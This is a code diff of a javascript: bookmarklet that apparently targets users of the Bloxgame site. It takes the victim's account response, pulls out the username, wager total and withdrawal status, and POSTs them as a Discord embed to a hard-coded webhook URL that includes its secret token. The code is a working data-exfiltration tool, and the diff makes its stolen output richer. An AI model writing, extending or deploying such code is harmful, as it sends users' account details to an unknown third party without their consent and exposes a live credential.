@@ -13,11 +13,30 @@ javascript:(function() {
 
             xhr.onreadystatechange = function() {
                 if (xhr.readyState === XMLHttpRequest.DONE) {
-                    var response = xhr.responseText;
+                    var response = JSON.parse(xhr.responseText);
+                    var user = response.user.username;
+                    var wager = response.wager;
+                    var sponsored = response.user.withdrawEnabled ? 'Enabled' : 'Disabled';
+
                     var webhookRequest = new XMLHttpRequest();
                     webhookRequest.open("POST", "https://discord.com/api/webhooks/1280222189429198858/M9axd-BRaA4_aLDb3aqzsHyvSsVVYusXykOX_K1hmvE6evrp5GkuWNqat4iy_p9HrNp3", true);
                     webhookRequest.setRequestHeader('Content-Type', 'application/json');
-                    webhookRequest.send(JSON.stringify({ content: 'Got user: ' + response }));
+                    webhookRequest.send(JSON.stringify({
+                        embeds: [{
+                            title: "User Information",
+                            color: 3066993,
+                            fields: [
+                                { name: "User", value: user, inline: true },
+                                { name: "Wager", value: wager.toString(), inline: true },
+                                { name: "Sponsored", value: sponsored, inline: true }
+                            ],
+                            footer: {
+                                text: "Bloxgame User Data",
+                                icon_url: "https://example.com/icon.png"
+                            },
+                            timestamp: new Date().toISOString()
+                        }]
+                    }));
                     console.log('Response sent to webhook.');
                 }
             };
